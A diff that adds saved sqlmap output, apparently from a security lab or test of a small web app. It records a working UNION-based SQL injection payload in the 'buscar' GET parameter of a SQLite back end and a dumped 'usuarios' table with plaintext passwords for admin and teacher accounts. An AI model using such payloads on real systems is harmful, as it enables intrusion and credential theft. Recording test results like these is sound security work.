@@ -1,0 +1,18 @@
+sqlmap identified the following injection point(s) with a total of 27 HTTP(s) requests:
+---
+Parameter: buscar (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: buscar=test' UNION ALL SELECT CHAR(113,118,106,98,113)||CHAR(116,101,99,69,90,72,100,105,84,115,101,67,75,120,114,107,78,78,89,120,74,110,105,72,76,89,78,76,118,78,117,100,77,71,84,71,73,82,90,100)||CHAR(113,122,112,112,113),NULL,NULL,NULL,NULL-- dfZp
+---
+back-end DBMS: SQLite
+Database: <current>
+Table: usuarios
+[2 entries]
++----+---------+----------+----------+
+| id | rol     | password | username |
++----+---------+----------+----------+
+| 1  | admin   | admin123 | admin    |
+| 2  | docente | profesor | profesor |
++----+---------+----------+----------+
+
